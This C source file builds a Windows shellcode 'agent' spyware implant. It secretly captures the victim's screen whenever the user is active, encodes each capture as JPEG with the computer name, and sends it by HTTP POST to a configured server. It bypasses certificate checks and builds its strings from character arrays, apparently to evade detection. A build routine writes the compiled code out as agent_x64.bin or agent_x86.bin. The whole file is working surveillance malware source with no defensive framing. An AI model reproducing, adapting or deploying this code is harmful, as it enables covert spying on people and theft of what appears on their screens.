#define CINTERFACE
#define COBJMACROS

#include <wincodec.h>
#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include <tchar.h>
#include <winhttp.h>
#include "func.h"
#include "config.h"


#define SUCCEEDED(hr)   (((HRESULT)(hr)) >= 0)

int main_entry();
void init_func(func_p func);
BOOL PostData(func_p func, WCHAR* fullUrl, BYTE* sendDataBuffer, DWORD sendDataSize);
BOOL SendSreenshot(func_p func, BYTE* screenshotData, DWORD screenshotDataSize);
void GetScreenshotData(func_p func, BYTE** Memory, DWORD* dataSize);
int entry();
void main_end();

#pragma optimize("ts", on)

int main_entry() {
    return entry();
};

BOOL PostData(func_p func, WCHAR* fullUrl, BYTE* sendDataBuffer, DWORD sendDataSize) {
    HINTERNET hSession;
    HINTERNET hConnect;
    HINTERNET hRequest;
    URL_COMPONENTS urlComponents;
    WCHAR hostname[256];
    WCHAR urlPath[256];


    WCHAR userAgent[] = USER_AGENT;
    WCHAR method[] = { 'P','O','S','T',0 };
    WCHAR header[] = { 'C','o','n','t','e','n','t','-','T','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','o','c','t','e','t','-','s','t','r','e','a','m','\r','\n','C','o','n','n','e','c','t','i','o','n',':',' ','c','l','o','s','e','\r','\n',0 };

    func->memset(&urlComponents, 0, sizeof(URL_COMPONENTS));
    func->memset(hostname, 0, sizeof(hostname));
    func->memset(urlPath, 0, sizeof(urlPath));

    urlComponents.dwStructSize = sizeof(urlComponents);
    urlComponents.lpszHostName = hostname;
    urlComponents.dwHostNameLength = sizeof(hostname) / sizeof(hostname[0]);
    urlComponents.lpszUrlPath = urlPath;
    urlComponents.dwUrlPathLength = sizeof(urlPath) / sizeof(urlPath[0]);
    urlComponents.dwSchemeLength = 1; 
    DWORD m_timeout = 10 * 60 * 1000; 

    if (!func->WinHttpCrackUrl(fullUrl, func->lstrlenW(fullUrl), 0, &urlComponents)) {
        return FALSE;
    }

    hSession = func->WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) {
        return FALSE;
    }

    if (!func->WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &m_timeout, sizeof(m_timeout))) {
        func->WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD redirectionPolicy = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    if (!func->WinHttpSetOption(hSession, WINHTTP_OPTION_REDIRECT_POLICY, &redirectionPolicy, sizeof(redirectionPolicy))) {
        func->WinHttpCloseHandle(hSession);
        return FALSE;
    }

    hConnect = func->WinHttpConnect(hSession, urlComponents.lpszHostName, urlComponents.nPort, 0);
    if (!hConnect) {
        func->WinHttpCloseHandle(hSession);
        return FALSE;
    }

    hRequest = func->WinHttpOpenRequest(hConnect, method, urlComponents.lpszUrlPath, NULL, NULL, NULL, (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        func->WinHttpCloseHandle(hConnect);
        func->WinHttpCloseHandle(hSession);
        return FALSE;
    }

    SIZE_T len = func->lstrlenW(header);
    func->WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);

    DWORD flags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
    if (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) {
        if (!func->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
            func->WinHttpCloseHandle(hRequest);
            func->WinHttpCloseHandle(hConnect);
            func->WinHttpCloseHandle(hSession);
            return FALSE;
        }
    }

    if (!func->WinHttpSendRequest(hRequest, NULL, 0, sendDataBuffer, sendDataSize, sendDataSize, NULL)) {
        func->WinHttpCloseHandle(hRequest);
        func->WinHttpCloseHandle(hConnect);
        func->WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (!func->WinHttpReceiveResponse(hRequest, NULL)) {
        func->WinHttpCloseHandle(hRequest);
        func->WinHttpCloseHandle(hConnect);
        func->WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    func->WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);

    func->WinHttpCloseHandle(hRequest);
    func->WinHttpCloseHandle(hConnect);
    func->WinHttpCloseHandle(hSession);

    if (statusCode != 200) {
        return FALSE;
    }

    return TRUE;
}

BOOL SendSreenshot(func_p func,BYTE* screenshotData, DWORD screenshotDataSize) {
    WCHAR serverUrl[] = SERVER_URL;

    char hostname[255];
    DWORD maxLength = 255;
    func->GetComputerNameA(hostname, &maxLength);

    DWORD hostnameSize = (func->lstrlenA(hostname)) * sizeof(char);

    DWORD postDataSize = sizeof(DWORD) + hostnameSize + screenshotDataSize;
    BYTE* postData = func->malloc(postDataSize);
    func->memcpy(postData, &hostnameSize, sizeof(DWORD));
    func->memcpy(postData + sizeof(DWORD), hostname, hostnameSize);
    func->memcpy(postData + sizeof(DWORD) + hostnameSize, screenshotData, screenshotDataSize);

    BOOL result = PostData(func, serverUrl, postData, postDataSize);
    func->free(postData);

    return result;
}

void GetScreenshotData(func_p func, BYTE** Memory, DWORD* dataSize) {
    CONST GUID GUID_ContainerFormatJpeg = { 0x19e4a5aa, 0x5662, 0x4fc5, 0xa0, 0xc0, 0x17, 0x58, 0x02, 0x8e, 0x10, 0x57 };
    CONST GUID GUID_WICPixelFormat24bppBGR = { 0x6fddc324, 0x4e03, 0x4bfe, 0xb1, 0x85, 0x3d, 0x77, 0x76, 0x8d, 0xc9, 0x0c };
    CONST GUID CLSID_WICImagingFactory2 = { 0x317d06e8, 0x5f24, 0x433d, 0xbd, 0xf7, 0x79, 0xce, 0x68, 0xd8, 0xab, 0xc2 };
    CONST GUID IID_IWICImagingFactory = { 0xec5ec8a9,0xc395,0x4314,0x9c,0x77,0x54,0xd7,0xa9,0x35,0xff,0x70 };

    DWORD dwBmpSize;
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    BITMAPINFOHEADER bi;
    BITMAP bm_info;
    IWICImagingFactory* factory = NULL;
    IWICBitmap* wic_bitmap = NULL;
    IWICStream* stream = NULL;
    IWICBitmapEncoder* encoder = NULL;
    IWICBitmapFrameEncode* frame = NULL;
    HRESULT hr = S_OK;
    LARGE_INTEGER pos;
    ULARGE_INTEGER size;
    WCHAR wcDisplay[] = { 'D','I','S','P','L','A','Y','\0' };

    func->memset(&bm_info, 0, sizeof(BITMAP));
    
    HDC hdcScreen = func->CreateDCW(wcDisplay, NULL, NULL, NULL);
    int width = func->GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = func->GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hdcMemDC = func->CreateCompatibleDC(hdcScreen);

    if (!hdcMemDC)
    {
        goto done;
    }
    hbmScreen = func->CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hbmScreen)
    {
        goto done;
    }

    func->SelectObject(hdcMemDC, hbmScreen);
    if (!func->BitBlt(
        hdcMemDC,
        0, 0,
        width, height,
        hdcScreen,
        0, 0,
        SRCCOPY))
    {
        goto done;
    }
    func->GetObjectW(hbmScreen, sizeof(BITMAP), &bmpScreen);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    *Memory = func->malloc(dwBmpSize / 6);
    func->memset(*Memory, 0, dwBmpSize / 6);
    hr = func->CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (!func->GetObjectW(hbmScreen, sizeof(bm_info), &bm_info)) {
        hr = E_FAIL;
    }
    factory = NULL;
    if (SUCCEEDED(hr)) {
        hr = func->CoCreateInstance(&CLSID_WICImagingFactory2, NULL, CLSCTX_INPROC_SERVER,
            &IID_IWICImagingFactory, &factory);
    }
    wic_bitmap = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICImagingFactory_CreateBitmapFromHBITMAP(factory, hbmScreen, NULL,
            WICBitmapIgnoreAlpha,
            &wic_bitmap);
    }
    stream = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICImagingFactory_CreateStream(factory, &stream);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICStream_InitializeFromMemory(stream, *Memory, dwBmpSize / 6);
    }
    encoder = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICImagingFactory_CreateEncoder(factory, &GUID_ContainerFormatJpeg, NULL, &encoder);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapEncoder_Initialize(encoder, (IStream*)stream, WICBitmapEncoderNoCache);
    }
    frame = NULL;
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapEncoder_CreateNewFrame(encoder, &frame, NULL);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_Initialize(frame, NULL);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_SetSize(frame, bm_info.bmWidth, bm_info.bmHeight);
    }
    if (SUCCEEDED(hr)) {
        GUID pixel_format = GUID_WICPixelFormat24bppBGR;
        hr = IWICBitmapFrameEncode_SetPixelFormat(frame, &pixel_format);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_WriteSource(frame, (IWICBitmapSource*)wic_bitmap, NULL);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapFrameEncode_Commit(frame);
    }
    if (SUCCEEDED(hr)) {
        hr = IWICBitmapEncoder_Commit(encoder);
    }
    pos.QuadPart = 0;
    IStream_Seek(stream, pos, STREAM_SEEK_CUR, &size);

    *dataSize = size.QuadPart;

    if (frame) {
        IWICBitmapFrameEncode_Release(frame);
    }
    if (encoder) {
        IWICBitmapEncoder_Release(encoder);
    }
    if (stream) {
        IWICStream_Release(stream);
    }
    if (wic_bitmap) {
        IWICBitmap_Release(wic_bitmap);
    }
    if (factory) {
        IWICImagingFactory_Release(factory);
    }

done:
    func->DeleteObject(hbmScreen);
    func->DeleteObject(hdcMemDC);
    func->DeleteDC(hdcScreen);
}

DWORD SreenshotThread(LPVOID param) {
    func_p func = (func_p)param;

    BYTE* screenshotData = NULL;
    DWORD screenshotDataSize = 0;
    GetScreenshotData(func, &screenshotData, &screenshotDataSize);

    if (screenshotData != NULL && screenshotDataSize != 0)
    {
        SendSreenshot(func, screenshotData, screenshotDataSize);
        func->free(screenshotData);
    }

    return 0;
}

int entry()
{
    func_t func;
    init_func(&func);

    func.SetProcessDPIAware();

    while (TRUE) {
        LASTINPUTINFO lpi;
        lpi.cbSize = sizeof(lpi);
        func.GetLastInputInfo(&lpi);
        ULONGLONG iTime = (func.GetTickCount64() - lpi.dwTime) / 1000;

        if (iTime > 10) //
        {
            func.Sleep(1000);
            continue;
        }

        func.CloseHandle(func.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SreenshotThread, &func, 0, NULL));
        //SreenshotThread(&func);

        func.Sleep(SCREENSHOT_CHECK_INTERVAL); //
    }

    return 0;
}

void main_end() {
};

#pragma optimize("ts", off)


#ifdef _WIN64
# define OUT_FILE_NAME "agent_x64.bin"
#else
# define OUT_FILE_NAME "agent_x86.bin"
#endif

#ifdef BUILD_SHELLCODE
int _tmain(int argc, _TCHAR* argv[])
{
    uint8_t* start = (uint8_t*)main_entry;
    uint8_t* end = (uint8_t*)main_end;
    size_t size = end - start;
    printf("[*] main shellcode start = %p, end = %p, size = %d\n", start, end, size);

    FILE* file = 0;
    fopen_s(&file, OUT_FILE_NAME, "wb");
    if (file == 0) {
        printf("[!] create out file error. file name = %s\n", OUT_FILE_NAME);
        return 0;
    }
    fwrite(start, 1, size, file);
    fflush(file);
    fclose(file);
    printf("[*] generate main shellcode sucess.\n");
    return 0;
}
#endif // BUILD_SHELLCODE
